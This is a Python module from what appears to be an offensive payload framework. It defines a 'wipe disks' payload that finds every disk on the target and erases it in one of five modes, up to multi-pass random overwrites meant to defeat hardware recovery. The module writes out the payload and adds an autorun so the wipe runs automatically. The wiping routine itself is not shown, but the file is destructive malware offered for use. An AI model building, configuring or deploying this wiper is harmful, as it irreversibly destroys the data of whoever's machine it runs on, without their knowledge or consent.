"""
Payload that scans for all disks, wiping them all. It has a few modes modes:

Mode A: Overwrite partition table and filesystem headers.
        Software recovery: Easily possible
        Hardware recovery: Easily possible
Mode B: Overwrite the partition table and filesystem headers then write 0 to every single byte.
        Software recovery: Not possible
        Hardware recovery: Possible with the right equipment
Mode C: Overwrite the partition table and filesystem headers then write 0, and then
        0xFF to every single byte.
        Software recovery: Not possible
        Hardware recovery: Possible with the right equipment, considerable recovery rate
Mode D: Overwrite the partition table and filesystem headers then write 0, and then 0xFF, and 
        then a random value to every single byte.
        Software recovery: Not possible
        Hardware recovery: Possible with the right equipment, low recovery rate
Mode E: Overwrite the partition table and filesystem headers then write 0, and then 0xFF, and 
        then 5 passes of random values to every single byte.
        Software recovery: Not possible
        Hardware recovery: Almost impossible to get much with the right equipment, however 
                           still very little parts may be recoverable
"""
from snr.core.payload.payload import Context, Payload
from snr.core.util import common_utils


class WipeDisksPayload(Payload):
    AUTHORS = ("GlobularOne",)
    TARGET_OS_LIST = ("All",)
    INPUTS = (
        ("WIPE_MODE", "A", 1, "Wipe mode, must be one of A, B, C, D and E"),
    )

    def generate(self, ctx: Context) -> int:
        variables = self.get_self_variables()
        if variables["WIPE_MODE"] not in ("A", "B", "C", "D", "E"):
            common_utils.print_error(
                f"Invalid wipe mode {variables['WIPE_MODE']!r}")
            return 1
        self.format_payload_and_write(ctx, variables)
        self.add_autorun(ctx)
        return 0


payload = WipeDisksPayload()
